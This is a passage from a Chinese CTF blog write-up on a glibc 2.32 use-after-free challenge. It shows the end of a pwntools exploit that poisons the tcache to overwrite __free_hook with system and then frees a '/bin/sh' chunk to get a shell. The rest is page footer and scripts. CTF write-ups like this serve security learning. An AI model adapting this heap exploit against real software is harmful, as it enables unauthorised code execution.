class="built_in">hex</span>(libc_base))</span><br><span class="line">edit(<span class="number">7</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;======================== TCACHE ATTACK ======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x20</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(pack(heap + <span class="number">0x730</span>, __free_hook)))</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x20</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>​                                                                                                                                            </p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Alex</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2021/05/18/GlibcUAF/">http://example.com/2021/05/18/GlibcUAF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com">Alex's blog~</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a><a class="post-meta__tags" href="/tags/ptmalloc2/">ptmalloc2</a><a class="post-meta__tags" href="/tags/safe-linking/">safe-linking</a><a class="post-meta__tags" href="/tags/libc-2-32/">libc-2.32</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2021/05/23/JlenuCTF/"><i class="fa fa-chevron-left">  </i><span>JlenuCTF</span></a></div><div class="next-post pull-right"><a href="/2021/05/11/pwn2/"><span>buuctf-pwn系列2</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://i.loli.net/2021/03/05/xqReclzVihJKGUu.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2021.03.05 - 2021 By Alex</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
  tex2jax: {
    inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
    processEscapes: true,
    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
  },
  CommonHTML: {
    linebreaks: { automatic: true, width: "90% container" }
  },
  "HTML-CSS": { 
    linebreaks: { automatic: true, width: "90% container" }
  },
  "SVG": { 
    linebreaks: { automatic: true, width: "90% container" }
  }
});
</script><script type="text/x-mathjax-config">MathJax.Hub.Queue(function() {
  var all = MathJax.Hub.getAllJax(), i;
  for (i=0; i < all.length; i += 1) {
    all[i].SourceElement().parentNode.className += ' has-jax';
  }
});
</script><script src="https://cdn.jsdelivr.net/npm/mathjax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>